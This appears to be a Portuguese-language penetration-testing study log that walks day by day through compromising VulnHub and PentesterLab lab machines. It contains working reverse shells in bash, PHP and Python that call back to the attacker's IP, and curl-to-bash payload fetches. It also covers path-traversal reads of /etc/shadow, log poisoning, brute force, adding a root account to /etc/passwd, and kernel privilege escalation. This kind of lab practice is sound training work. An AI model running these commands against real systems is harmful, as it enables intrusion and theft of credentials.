
__--VM--__	<br/>
desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/ <br/>
desafio 2 - https://pentesterlab.com/exercises/s2-052/course	<br/>
desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/	<br/>
desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/	<br/>
desafio 5 - https://www.vulnhub.com/entry/violator-1,153/	<br/>
desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/	<br/>
Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/		<br/>
Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/		<br/>
Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download	<br/>
Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/	<br/>
Desafio 11 - https://vulnhub.com/entry/goldeneye-1,240/	<br/>
Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/	<br/>
Desafio 13 - 
<br/>**--VM--**
	
	
<h3>Dia 1 - desafio 2(1° desafio)     7/9/2020</h3>

       *scan com nmap        
        *identificação do wordpress -> wpscan -> pesquisar por exploit dos plugins -> wp_google
        *msfconsole -> auxiliary/admin/http/wp_google_maps_sqli
        *quebrar a hash da senha com John 
                john arquivo_com_hash.txt --wordlist=rockyou.txt
        *searchsploit webmin(etapa 1 com nmap - serviço porta 10000)
                *msfconsole -> search webmin
                *use exploit/linux/http/webmin_backdoor  
                *Set ForceExploit true -> versão do exploit é diferente do seviço, força a execução mesmo assim
                *set ssl true -> não sei pq, talvez seja obrigatório "uso do ssl" 
                *find /root
                        cat flag.txt
                *find /home
                        cat /home/webmaster/flag.txt



<h3>Dia 2 - desafio 2(° 2desafio)			8/9/2020</h3>
	
	*Pesquisa sobre “trust” -> vulnerabilidade conhecida -> exploit encontrado: Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution
	
	*varredura da máquina
		nmap -sV
	*execuçaõ do exploit no msfconsole




<h3>Dia 3 			9/9/2020</h3>
	
	*Varredura do alvo
		indetificação vulnerabilidade 
			
	*Invasão do alvo
		exploit unix/webapp/drupal_drupalgeddon2
	
	*Escalaçao de privilégios referência CVE 2015-1328
		msf5 search  CVE-2015-1328
			exploit/linux/local/overlayfs_priv_esc
			
			*Manualmente
			locate linux/local/37292.c
			# gcc -o [arquivo saida]  37292.c    (compilar o arquivo qe está em C )
			
			meterpreter: upload [arquivo saida] /tmp
					OU
			meterpreter: shell
			cd /tmp
			wget 192.168.0.1/[arquivo saida]  ↔ baixar o arquivo de um server local
			
			
			
<h3>Dia 4 			10/9/2020</h3>

	*Varredra da máquina
	
	*ftp://ip_maquina
	
	*nc ip_maquina 21
		site cpfr /home/patrick/version_control

		site cpto /home/ftp/version_control

			descobrir o diretorio path dos dados do server
				-> cat version_control
					/var/www/tryingharderisjoy
		*msfconsole
			use unix/ftp/proftpd_modcopy_exec
					ir para uma shell interativa -> python -c 'import pty;pty.spawn("/bin/sh")'		
			dados em /var/www/tryingharderisjoy/ossec
				cat patricksecretsofjoy
			su patrick
			sudo -l
				/home/patrick/script/test
		*criando script
			echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test

			*entrar no ftp
				ftp ip_maquina
					anonymous
						put arquivo -> upload do arquivo
							put test
		*nc para mover o arquivo
			site cpfr /home/ftp/test
			
			site cpto /home/patrick/script/test

		*executar 
			sudo /home/patrick/script/test			
			



<h3>Dia 5 			11/9/2020</h3>

	*Scan básico
		-sV -Pn  ip_alvo
		
	*criação de world list com dados do link (link na página local)
	
	*nc ip port
		site cpfr /etc/passwd
		site cpto  /var/www/html/passwd
		
			http://192.168.100.8/passwd
			
		*criação lista de users
			mg
			af
			dg
			aw
			
		*hydra pra brute force ftp
			-L userlist.txt -P passlist.txt  192.168.100.8 ftp
			
		* msfconsole unix/ftp/proftpd_modcopy_exec
			entrar shell interativo
				python pty...
			sudo -l
			sudo /home/dg/bd/sbin/proftpd
			
			upar para meterpreter
				session -u sessão
				
				portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1
				
				use exploit/unix/ftp/proftpd_133c_backdoor 
				
				set payload
				


<h3>Dia 6 			12/9/2020</h3>

	*scan
	
	*enumeração diretórios web
		dirb 
		
	
	*(manualemnte) curl
		curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.100.9/administrator/alerts/alertConfigField.php?
		
		curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.100.9/administrator/alerts/alertConfigField.php?

		
	*ssh

<h3>Dia 7 			13/9/2020</h3>

	*scan alvo
	
	*enumerar plugins wp
		WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload
			criar um html
	*criar um shell reverse
		<?php
			exec("/bin/bash -c 'bash -i >& /dev/tcp/my_ip/porta 0 >&1' ");		
		?>

	*nc -lnvp 
	*abrir o arquivo(*criar um html*) no server
	
	*encontrando arqivos suid
		find / -perm -u=s -type f 2>/dev/null
	
	*passwd
		criar um com base do alvo, adicionar user
			pcpc:hash_opensll:0:0:root:/root:/bin/bash   -> igual do root, porém user diferente e com hash senha no lugar do x
				senha default linux -> openssl passwd -1 -salt pcpc batata
				
	*simple server com python
		python -m SimpleHHTPServer 8081
		
	*baixar o novo arquivo passwd do kali
		wget http://ip_kali:8081/passwd
		erro no nome arquivo -> saida de passwd vai para passwd -> wget  -O passwd http://ip_kali:8081/passwd
		
		su pcpc 
			pass -> batata
			root pois está no mesmo grupo
			

<h3>Dia 8 			14/9/2020</h3>

	*scan padrão
	
	*ftp login
		anonymous
			get backp -> baixar o arquivo lá
			
		*quebrar credencial
				john backup
		
		*ssh login
			sudo -l
				sudo /usr/bin/ed   /etc/passwd 
				a -> append

				*adicionar usario ao arquivo
					openssl passwd -1 -salt usuario senha 		
						pcbeco:$1$pcbeco$F6qnmjD.aaKG2d0n2OATa1:0:0:root:/root:/bin/bash

				.
				w /etc/passwd

<h3>Dia 9 			15/9/2020</h3>
	
	*scan
	
	*searchsploit drupal
			34992.py
				explo.py
				drupalpass.py
					explo.py http://192.168.100.11/node?destination=node batman robin
					
	* appearence
		themes
			baixar qualquer um
				template.php
					adcionar codigo malicioso
						exec("/bin/bash -c  'bash -i >& /dev/tcp/192.168.100.x/443 0>&1'");

		*nc -lnvp 433
			python -c 'import pty;pty.spawn("/bin/sh")'
				find / -perm -u=s -file f 2>&-
					/usr/bin/find -exec  "/bin/bash" \;


<h3>Dia 10			16/9/2020</h3>

	*burp suite
	repeater -> index.php?file=about.php
	/var/log/auth.log
		#ssh root@192.168.0.x vai aparecer no log
		#usaremos no lugar do usuario algum script php para ser executado no saida do log
			ssh '?php system($_GET[x]); ?>'@192.168.0.x

			file=/var/log/auth.log&x=ls
			#passa o comando ls como parametro de x

			encodar como html para comandos mais complexos
			 decoder
				ls -lh -> %6c%73%20%2d%6c%68
					 index.php?file=/var/log/auth.log&x=%6c%73%20%2d%6c%68

	*msfvenom -p cmd/unix/reverse_python lhost=192.168.0.x port=443 -f raw
	#saida em linha -> encodar no burp

	*nc -lnvp  443
		python -c 'import pty;pty.spawn("/bin/bash")'	

			*msfvenom -p cmd/unix/reverse_python lhost=192.168.0.x port=443 -f raw > shell_py
				transferir o shell_py para o alvo
					kali -> 	python -m SimpleHTTPServer 8080
					alvo -> wget http://192.168.0.x:8080/shell_py

	sudo /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
		/var/log/auth.log  | shell_py
		
		

<h3>Dia 11 			17/9/2020</h3>

	*scan padrão
		porta 80
			inpecionar página/visualizar origem pagina -> script js -> terminal.js
				password criptografada url
					burp decoder
						InvincibleHack3r
		
	*scan -p-
	pop3 55007
		nc 192.168.0.x 55007
			USER boris
			PASS InvincibleHack3r
				senha errada, user existe

	*hydra -l (user) -P (senhas-wordlist) 192.168.0.x (-s (porta) sem o -s ele roda na porta padrão) pop3 (protocolo)
		password: secret1!
			nc 192.168.0.x 55007
			user boris
			pass secret1!

					pop3
						list -> lista emails
						retr x -> ler email	-> retr 2 -> natalya

			hydra -l  natalya -P (senhas-wordlist) 192.168.0.x -s 55007 pop3 
				pass: bird

			nc 192.168.0.x 55007
			user natalya
			pass bird

			retr 2 
				user: xenia
				pass: RCP90rulez!

				adcionar ao /etc/host 
					192.168.100.14	severnaya-station.com 
						http://severnaya-station.com/gnocertdir/
							user: xenia
							pass: RCP90rulez!
								
				my profile -> messages -> Dr Doak
					 hydra -l  doak -P /usr/share/wordlist/fasttrack.txt 192.168.0.x -s 55007 pop3
					pass: goat
						nc 192.168.0.x 55007
						user doak
						pass goat
							list
							retr x

							user: dr_doak
							pass: 4England!

						logout moodle
						novo login
							user: dr_doak
							pass: 4England!
								my profile -> my private files -> s3cret.txt

						http://severnaya-station.com/dir007key/for-007.jpg
						salvar imagem
				*strings imagem/exiftool imagem

				echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d 

					moodle
					user: admin
					pass: xWinter1995x!

						site administrator -> plugin ->text editor -> tynyMCE html editor 
							Spell engine = PSpellShell
								
						site administrator -> server -> system paths
							path to aspell ->  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 				os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

			editar ip e porta

			nc -lnvp 443

			*moodle
			Home -> My profile -> Blogs -> Add a new entry
				escrever qualquer coisakasdasfosjdjoas
				clicar em Toggle spellchecker -> opção inferior dirito do menu de opções “ABC” para chamar o spell

		uname -a

	kali-> searchsploit linux 3.13
		/usr/share/exploitdb/exploits/linux/local/37292.c

		compilar o arquivo -> gcc -o data 37292.c (compilou 37292.c pra data)

			transferir para a maquina alvo
				python -m SimpleHTTPServer 8080
				m_alvo -> wget ip_kali:8080/37292.c

				chmod +x data -> pra execução
				./data  -> vai dar erro pois n tem o gcc  pra compilar, porém em /usr/bin existe o cc que também serve pra compilar

		editar o 37292.c pois esta referenciando a lib do gcc
			vim datanovo -> linha 143 , tirar o gcc e por cc											

			mandar pro alvo
				compilar -> cc -o datanovo 37292.c
					executar -> ./datanovo
					root :)
						


<h3>Dia 12 			18/9/2020</h3>

	*scan default
	
	*enum4linux
	
	*ip:8080
		http://192.168.100.16:8080/robots.txt	
			/tryharder/tryharder
				*base64
					“password”
				
	*smbclient \\\\192.168.100.16\\qiu -U qiu
		-U -> user -> enum4linux -> qiu
		pass -> password -> ...robots.txt
		
		*ls
			cd .opensesame
			get config -> baixar
				exit
		* Port Knocking Daemon Configuration
		“fazer as requisições na ordem pra executar o comando do firewall e liberar a porta”
			exemplo 1 -> nc 192.168.100.16 159 ; nc 192.168.100.16 27391 ; nc 192.168.100.16 4
			exemplo 2 -> knock 192.168.100.16 159 27391 4 -v
			
				http://192.168.100.16/
					http://192.168.100.16/robots.txt
						http://192.168.100.16/nomercy/
		
			searchsploit rips 0.53
				cat  /usr/share/exploitdb/exploits/php/webapps/18660.txt
					http://192.168.100.16/nomercy/windows/code.php?file=../../../../../../etc/passwd
					*http://192.168.100.16:8080/
						“/etc/tomcat7/tomcat-users.xml”
							http://192.168.100.16/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml
					http://192.168.100.16:8080/
					 	“manager webapp”
							user: - thisisasuperduperlonguser
							pass: - heartbreakisinevitable
							
			*msfvenom -p linux/x86/shell_reverse_tcp lhost=ip_kali lport=443 -f war -o beco.war
				7z l beco.war
					copiar nome **.jsp
						upar arquivo beco.war no tomat -> WAR file to deploy -> Browse -> deploy
							
			*kali -> nc -lnvp 443
			
			*tomcat -> 192.168.100.16:8080/beco/wcsnsdcnkynqv.jsp
			
			*shell
				python -c 'import pty;pty.spawn("/bin/sh")'
				su fluffy
				pass: freakishfluffybunny
				
				cd /home/fluffy
					ls -a
						cd .private
						/home/fluffy/.private/secrets
						cat timeclock
						
			*kali -> msfvenom -p cmd/unix/reverse_netcat lhost=192.168.100.4 lport=4444 -f raw > beco2.sh
				vim beco2.sh
					echo “xxxxxx” >> timeclock
					
					python -c 'import pty;pty.spawn("/bin/sh")'
				
				OBS: cd /home/fluffy/.private/secrets					
				*nc -lnvp 4444
				*shell curl -s http://192.168.100.4:8080/beco2.sh | bash -> vai requisitar o beco2.sh e executar o bash
					cat timeclock
						ultima linha, basta aguardar que a tarerfa será executa e então o comando será executado.(cromtab)
		
		
		

